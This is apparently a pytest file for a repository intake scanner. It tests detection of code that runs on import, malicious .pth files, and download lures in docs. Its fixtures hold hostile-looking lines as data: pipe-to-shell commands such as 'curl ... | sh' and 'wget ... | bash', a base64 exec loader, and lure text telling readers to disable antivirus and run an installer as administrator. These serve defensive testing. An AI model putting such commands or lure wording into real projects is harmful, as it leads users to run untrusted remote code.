"""Repo intake, item 5: code that runs when it is imported, and download lures in the docs."""
from code_guardian import intake
from intake_helpers import mk, of


def scan(tmp_path, files):
    return intake.scan(mk(tmp_path / "repo", files))


def test_code_that_runs_on_import(tmp_path):
    res = scan(tmp_path, {
        "pkg/__init__.py": "import urllib.request\nurllib.request.urlopen('https://example.com/x')\n",
        "pkg/a.py": "import subprocess\nsubprocess.run(['id'])\n",
        "pkg/b.py": "import os\nif __name__ == '__main__':\n    os.system('id')\n",
        "pkg/c.py": "import subprocess\ndef f():\n    subprocess.run(['id'])\n",
        "pkg/d.py": "import base64\nexec(base64.b64decode(DATA))\n",
        "pkg/e.py": "import os\ntry:\n    os.system('id')\nexcept Exception:\n    pass\n",
        "pkg/f.py": "class K:\n    import requests\n    r = requests.get('https://example.com')\n",
        "tests/test_a.py": "import subprocess\nsubprocess.run(['id'])\n",
        "setup.py": "import subprocess\nsubprocess.run(['id'])\n",
    })
    got = {f["file"]: (f["confidence"], f["line"]) for f in of(res, "exec.on_import")}
    assert got == {"pkg/__init__.py": ("high", 2), "pkg/a.py": ("medium", 2), "pkg/d.py": ("high", 2),
                   "pkg/e.py": ("medium", 3), "pkg/f.py": ("medium", 3), "tests/test_a.py": ("low", 2)}
    assert of(res, "exec.on_import")[0]["match"] in ("urllib.request.urlopen('https://example.com/x')",)


def test_imports_that_are_only_definitions_are_quiet(tmp_path):
    res = scan(tmp_path, {"pkg/__init__.py": "from .a import f\n__all__ = ['f']\n", "pkg/a.py": "def f():\n    return 1\nX = f()\n"})
    assert of(res, "exec.on_import") == []


def test_pth_files_that_import_run_at_interpreter_start(tmp_path):
    res = scan(tmp_path, {"a.pth": "import os; os.system('id')\n", "b.pth": "/some/path\n"})
    assert [(f["file"], f["confidence"]) for f in of(res, "exec.pth_import")] == [("a.pth", "high")]


def test_download_lures_in_the_docs(tmp_path):
    res = scan(tmp_path, {
        "README.md": "# T\n\n```\ncurl -fsSL https://example.com/install.sh | sh\n```\n",
        "docs/a.md": "Run: iwr https://example.com/a.ps1 | iex\n",
        "docs/b.md": "wget -qO- http://203.0.113.9/x | bash\n",
        "docs/c.md": "Use `curl -o out.json https://example.com/data` to fetch the data.\n",
    })
    got = {f["file"]: (f["confidence"], f["line"]) for f in of(res, "lure.pipe_to_shell")}
    assert got == {"README.md": ("medium", 4), "docs/a.md": ("medium", 1), "docs/b.md": ("high", 1)}


def test_run_this_exe_lures(tmp_path):
    res = scan(tmp_path, {
        "README.md": "1. Download Setup.exe from the releases page\n2. Disable your antivirus and run it as administrator\n3. Archive password: 1234\n",
        "docs/x.md": "Then run `build.exe --help` and read the output.\n",
        "docs/y.md": "Download the installer and double-click Installer.msi to install.\n",
        "docs/z.md": "Open the file with a text editor.\n",
    })
    got = {}
    for f in of(res, "lure.run_download"):  # findings are sorted highest first; keep the highest per file
        got.setdefault(f["file"], f["confidence"])
    assert got == {"README.md": "high", "docs/y.md": "medium", "docs/x.md": "low"}
    readme = [f["match"] for f in of(res, "lure.run_download") if f["file"] == "README.md"]
    assert any("Disable your antivirus" in m for m in readme) and any("password" in m.lower() for m in readme)


def test_a_table_cell_naming_a_password_field_is_not_an_archive_lure(tmp_path):
    res = scan(tmp_path, {"README.md": '| `password="secret"` in documentation samples | same rule |\n'})
    assert of(res, "lure.run_download") == []
